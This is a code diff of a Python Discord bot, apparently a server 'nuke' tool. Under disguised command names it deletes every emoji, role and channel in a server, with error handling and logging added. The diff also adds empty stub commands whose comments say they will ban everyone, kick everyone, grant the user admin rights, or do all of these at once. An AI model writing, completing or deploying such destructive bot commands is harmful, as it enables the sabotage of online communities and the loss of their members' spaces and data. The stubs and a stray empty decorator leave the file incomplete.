@@ -27,36 +27,64 @@ async def kick(ctx, member: discord.Member, Reason=None):
     await member.kick(reason=Reason)
     await ctx.send(f"The user **{member}** has been kicked!")
 
-@client.command()
+@client.command()   #To delete all emojis
 async def omegalulgone(ctx):
     
     all_emoji= await ctx.guild.fetch_emojis()
     for emoji in all_emoji:
-        await emoji.delete()
+        try:
+            await emoji.delete()
+            print(f"Deleted emoji: {emoji}")
+        except:
+            print(f"Couldn't delete emoji: {emoji}")
+            pass
+            
     print("Emojis have been taken to the back and shot in the head!")
 
-@client.command()
+@client.command()   #To delete all roles
 async def allwhite(ctx):
     all_roles= await ctx.guild.fetch_roles()
     for role in all_roles:
         try:
             await role.delete()
+            print(f"Deleted role: {role}")
         except:
+            print(f"Couldn't Delete role: {role}")
             pass
     print("Roles have been taken care of")
 
-@client.command()
+@client.command()   #To delete all channels
 async def blindnesspotion(ctx):
     all_channels= await ctx.guild.fetch_channels()
     for channel in all_channels:
         try:
             await channel.delete()
+            print(f"Deleted channel:{channel}")
         except:
+            print(f"Coundn't delete channel: {channel}")
             pass
     print("Channels have been taken care of...")
 
+@client.command()   #To ban everyone
+async def whomegalol(ctx):
+    pass
+
+@client.command()   #To kick everyone
+async def kickbuttowski(ctx):
+    pass
+
+@client.command()   #To get admin permissions
+async def jamesbond007(ctx):
+    pass
+
+@client.command()   #To: Ban people, delete channels, delete roles, delete emojis, making the user admin
+async def everthingatoncebylenka():
+    pass
+
+@client.command()
+
 @client.command()
 async def help(ctx):
-    await ctx.send("The help command is being created! Hang on tight!")
+    await ctx.send("The help command is under development! Hang on tight!")
 
 client.run(bottk)
